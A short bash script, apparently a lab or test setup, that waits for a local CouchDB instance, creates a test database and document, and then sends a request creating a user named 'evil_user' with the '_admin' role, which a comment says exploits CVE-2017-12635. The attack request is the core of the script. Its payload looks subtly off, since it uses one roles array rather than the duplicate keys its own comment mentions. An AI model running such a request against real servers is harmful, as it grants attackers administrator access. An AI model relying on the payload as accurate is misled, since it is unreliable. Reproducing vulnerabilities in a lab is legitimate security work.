#!/bin/bash

# Wait for CouchDB to start
until curl -s http://admin:password@localhost:5984/_up; do
  echo "Waiting for CouchDB to start..."
  sleep 1
done

# Create a test database
curl -X PUT http://admin:password@localhost:5984/testdb

# Add a test document
curl -X POST http://admin:password@localhost:5984/testdb \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "type": "example"}'

# Create a user with duplicate roles
curl -X PUT http://admin:password@localhost:5984/_users/org.couchdb.user:evil_user \
  -H "Content-Type: application/json" \
  -d '{"name": "evil_user", "password": "password", "roles": ["user", "_admin"], "type": "user"}'

# Note: The above user creation exploits the CVE-2017-12635 vulnerability.
